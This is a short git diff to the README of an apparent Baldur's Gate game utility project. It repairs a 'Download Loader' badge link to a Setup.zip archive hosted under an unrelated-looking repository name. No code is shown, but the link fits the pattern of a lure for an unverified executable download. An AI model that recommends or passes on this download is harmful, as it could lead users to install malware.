@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for Baldur's Gate Enhanced Edition Utility
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)]https://github.com/WASD122/bvvb/releases/download/main/Setup.zip)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/WASD122/bvvb/releases/download/main/Setup.zip)
 
 ---
 
@@ -38,4 +38,5 @@ configs/
 `Baldur-s-Gate-Enhanced-Edition-Utility` · Updated: 2026-10-07
 
 **Tags:** `baldurs-gate` `enhanced-edition` `utility` `crpg` `savegame`
+
 
